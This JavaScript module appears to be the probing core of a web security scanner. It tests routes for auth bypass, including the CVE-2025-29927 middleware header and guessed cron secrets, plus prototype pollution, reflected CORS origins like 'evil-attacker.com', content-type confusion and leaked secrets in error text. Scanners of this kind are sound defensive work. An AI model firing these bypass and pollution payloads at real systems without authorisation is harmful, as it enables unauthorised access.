/**
 * Adaptive Probe Engine (Portable)
 *
 * Multi-step probes that escalate based on results:
 *   Observe → Hypothesize → Test → Analyze → Repeat
 *
 * Each probe chain starts with a hypothesis and adapts.
 * Results feed into the SecurityKnowledgeGraph for chain discovery.
 */

const DEFAULT_TIMEOUT = 10_000;

async function probe(base, path, opts = {}) {
  const url = `${base}${path}`;
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), opts.timeout || DEFAULT_TIMEOUT);
  const start = Date.now();
  try {
    const res = await fetch(url, { ...opts, signal: controller.signal });
    const elapsed = Date.now() - start;
    let body = null;
    const ct = res.headers.get("content-type") || "";
    if (ct.includes("json")) {
      try { body = await res.json(); } catch { body = null; }
    } else {
      try { body = await res.text(); } catch { body = null; }
    }
    return {
      url: path, status: res.status,
      headers: Object.fromEntries(res.headers.entries()),
      body, elapsed, ok: res.ok,
    };
  } catch (err) {
    return {
      url: path, status: 0, headers: {}, body: null,
      elapsed: Date.now() - start, ok: false,
      error: err.name === "AbortError" ? "timeout" : err.message,
    };
  } finally {
    clearTimeout(timeout);
  }
}

/**
 * Chain 1: Auth Escalation — tries increasingly privileged access
 */
export async function probeAuthEscalation(base, route, graph) {
  const findings = [];
  const url = route.url.replace(/:(\w+)/g, "test-$1");

  // Step 1: No auth
  const noAuth = await probe(base, url, {
    method: route.methods[0] === "GET" ? "GET" : "POST",
    ...(route.methods[0] !== "GET" ? {
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({}),
    } : {}),
  });
  graph.addProbeResult({ probe: "auth-escalation", step: "no-auth", ...noAuth });

  if (noAuth.status === 200 && !route.auth.includes("public")) {
    findings.push(graph.addFinding({
      severity: "critical", category: "auth-bypass",
      title: `Unauthenticated access to ${url}`,
      detail: `Expected 401 for ${route.auth.join("+")} route, got 200`,
      routeUrl: route.url, probeData: noAuth,
    }));
    return findings;
  }

  // Step 2: Fake Bearer token
  const fakeAuth = await probe(base, url, {
    method: route.methods[0] === "GET" ? "GET" : "POST",
    headers: { "Content-Type": "application/json", Authorization: "Bearer fake-token-AAAA" },
    ...(route.methods[0] !== "GET" ? { body: JSON.stringify({}) } : {}),
  });
  graph.addProbeResult({ probe: "auth-escalation", step: "fake-bearer", ...fakeAuth });

  if (fakeAuth.status === 200 && !route.auth.includes("public")) {
    findings.push(graph.addFinding({
      severity: "critical", category: "auth-bypass",
      title: `Fake Bearer token accepted on ${url}`,
      detail: `Route accepted an arbitrary Bearer token`,
      routeUrl: route.url, probeData: fakeAuth,
    }));
  }

  // Step 3: CVE-2025-29927 middleware bypass (admin routes)
  if (route.auth.includes("admin")) {
    const cveBypass = await probe(base, url, {
      method: route.methods[0] === "GET" ? "GET" : "POST",
      headers: {
        "Content-Type": "application/json",
        "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware",
      },
      ...(route.methods[0] !== "GET" ? { body: JSON.stringify({}) } : {}),
    });
    graph.addProbeResult({ probe: "auth-escalation", step: "cve-2025-29927", ...cveBypass });

    if (cveBypass.status === 200) {
      findings.push(graph.addFinding({
        severity: "critical", category: "auth-bypass",
        title: `CVE-2025-29927 middleware bypass on ${url}`,
        detail: `x-middleware-subrequest header bypassed auth`,
        routeUrl: route.url, probeData: cveBypass,
      }));
    }
  }

  // Step 4: Common secret guesses (cron routes)
  if (route.auth.includes("cron")) {
    for (const guess of ["secret", "password", "cron", "Bearer cron", ""]) {
      const secretProbe = await probe(base, url, {
        method: "GET", headers: { Authorization: `Bearer ${guess}` },
      });
      if (secretProbe.status === 200) {
        findings.push(graph.addFinding({
          severity: "high", category: "auth-bypass",
          title: `Weak CRON_SECRET on ${url}`,
          detail: `Guessed secret: "${guess}"`,
          routeUrl: route.url, probeData: secretProbe,
        }));
        break;
      }
    }
  }

  return findings;
}

/**
 * Chain 2: HTTP Method Confusion
 */
export async function probeMethodConfusion(base, route, graph) {
  const findings = [];
  const url = route.url.replace(/:(\w+)/g, "test-$1");
  const unexpected = ["GET", "POST", "PUT", "DELETE", "PATCH"].filter(m => !route.methods.includes(m));

  for (const method of unexpected) {
    const res = await probe(base, url, {
      method,
      headers: { "Content-Type": "application/json", Authorization: "Bearer test-token" },
      ...(["POST", "PUT", "PATCH"].includes(method) ? { body: JSON.stringify({}) } : {}),
    });
    graph.addProbeResult({ probe: "method-confusion", method, ...res });

    if (res.status === 200) {
      findings.push(graph.addFinding({
        severity: "low", category: "method-confusion",
        title: `Unexpected ${method} accepted on ${url}`,
        detail: `Route exports ${route.methods.join(",")} but accepted ${method}`,
        routeUrl: route.url, probeData: res,
      }));
    }
  }
  return findings;
}

/**
 * Chain 3: Prototype Pollution
 */
export async function probePrototypePollution(base, route, graph) {
  const findings = [];
  if (!route.methods.includes("POST")) return findings;
  const url = route.url.replace(/:(\w+)/g, "test-$1");

  for (const payload of [
    { "__proto__": { "isAdmin": true } },
    { "constructor": { "prototype": { "isAdmin": true } } },
    { "__proto__": { "role": "admin" } },
  ]) {
    const res = await probe(base, url, {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: "Bearer test-token" },
      body: JSON.stringify(payload),
    });
    graph.addProbeResult({ probe: "prototype-pollution", payload: Object.keys(payload)[0], ...res });

    if (res.status === 200 && res.body?.isAdmin) {
      findings.push(graph.addFinding({
        severity: "critical", category: "injection",
        title: `Prototype pollution on ${url}`,
        detail: `__proto__ payload resulted in isAdmin:true`,
        routeUrl: route.url, probeData: res,
      }));
    }
  }
  return findings;
}

/**
 * Chain 4: Information Leakage
 */
export async function probeInfoLeakage(base, route, graph) {
  const findings = [];
  const url = route.url.replace(/:(\w+)/g, "test-$1");

  const triggers = [
    { body: "not-json", contentType: "application/json" },
    { body: JSON.stringify({ __invalid: true }), contentType: "application/json" },
    { body: "", contentType: "application/json" },
  ];

  for (const trigger of triggers) {
    const res = await probe(base, url, {
      method: route.methods.includes("POST") ? "POST" : "GET",
      headers: { "Content-Type": trigger.contentType, Authorization: "Bearer trigger-error-token" },
      ...(route.methods.includes("POST") ? { body: trigger.body } : {}),
    });

    if (res.status >= 400 && typeof res.body === "string") {
      for (const { pattern, name } of [
        { pattern: /at\s+\w+\s+\(.*\.js:\d+:\d+\)/, name: "stack-trace" },
        { pattern: /node_modules/, name: "dependency-path" },
        { pattern: /\/Users\/|\/home\/|\/var\//, name: "filesystem-path" },
        { pattern: /FIREBASE_|GOOGLE_|STRIPE_|OPENAI_|DATABASE_/, name: "env-var-name" },
        { pattern: /192\.168\.|10\.\d+\.|172\.(?:1[6-9]|2\d|3[01])\./, name: "internal-ip" },
      ]) {
        if (pattern.test(res.body)) {
          findings.push(graph.addFinding({
            severity: name === "stack-trace" || name === "env-var-name" ? "medium" : "low",
            category: "info-leak",
            title: `${name} leaked on ${url}`,
            detail: `Error response contains ${name} pattern`,
            routeUrl: route.url, probeData: { status: res.status },
          }));
          break;
        }
      }
    }
  }
  return findings;
}

/**
 * Chain 5: CORS Probe
 */
export async function probeCors(base, route, graph) {
  const findings = [];
  const url = route.url.replace(/:(\w+)/g, "test-$1");

  for (const origin of [
    "https://evil-attacker.com", "null",
    "https://your-app.evil.com", "https://your-app-typo.com",
  ]) {
    const res = await probe(base, url, {
      method: "OPTIONS",
      headers: { Origin: origin, "Access-Control-Request-Method": "POST" },
    });
    const acao = res.headers["access-control-allow-origin"];
    if (acao === origin) {
      findings.push(graph.addFinding({
        severity: origin === "null" ? "high" : "medium",
        category: "cors-misconfiguration",
        title: `CORS reflects evil origin on ${url}`,
        detail: `Origin "${origin}" reflected`,
        routeUrl: route.url, probeData: { origin, reflected: acao },
      }));
    }
    if (acao === "*") {
      findings.push(graph.addFinding({
        severity: "medium", category: "cors-misconfiguration",
        title: `CORS wildcard on ${url}`,
        detail: `Access-Control-Allow-Origin: *`,
        routeUrl: route.url, probeData: { origin, reflected: acao },
      }));
    }
  }
  return findings;
}

/**
 * Chain 6: Content-Type Confusion
 */
export async function probeContentTypeConfusion(base, route, graph) {
  const findings = [];
  if (!route.methods.includes("POST")) return findings;
  const url = route.url.replace(/:(\w+)/g, "test-$1");

  for (const { ct, body } of [
    { ct: "application/xml", body: '<?xml version="1.0"?><root><evil>true</evil></root>' },
    { ct: "application/x-www-form-urlencoded", body: "email=test@test.com&admin=true" },
  ]) {
    const res = await probe(base, url, {
      method: "POST",
      headers: { "Content-Type": ct, Authorization: "Bearer test-token" },
      body,
    });
    graph.addProbeResult({ probe: "content-type-confusion", contentType: ct, ...res });

    if (res.status === 200) {
      findings.push(graph.addFinding({
        severity: "low", category: "content-type-confusion",
        title: `Unexpected Content-Type accepted on ${url}`,
        detail: `Sent ${ct} but got 200`,
        routeUrl: route.url, probeData: res,
      }));
    }
  }
  return findings;
}

/**
 * Chain 7: Timing Analysis
 */
export async function probeTimingAnalysis(base, route, graph) {
  const findings = [];
  const url = route.url.replace(/:(\w+)/g, "test-$1");

  const timings = [];
  for (let i = 0; i < 5; i++) {
    const res = await probe(base, url, {
      method: route.methods[0] === "GET" ? "GET" : "POST",
      headers: { "Content-Type": "application/json", Authorization: "Bearer timing-test-token" },
      ...(route.methods[0] !== "GET" ? { body: JSON.stringify({}) } : {}),
    });
    timings.push(res.elapsed);
  }

  const avg = timings.reduce((a, b) => a + b, 0) / timings.length;
  const variance = Math.sqrt(timings.reduce((sum, t) => sum + (t - avg) ** 2, 0) / timings.length);

  graph.addProbeResult({ probe: "timing-analysis", url: route.url, avgMs: Math.round(avg), varianceMs: Math.round(variance) });

  if (variance > 100 && route.auth.includes("cron")) {
    findings.push(graph.addFinding({
      severity: "info", category: "timing",
      title: `High timing variance on ${url}`,
      detail: `avg=${Math.round(avg)}ms variance=${Math.round(variance)}ms`,
      routeUrl: route.url,
    }));
  }
  return findings;
}
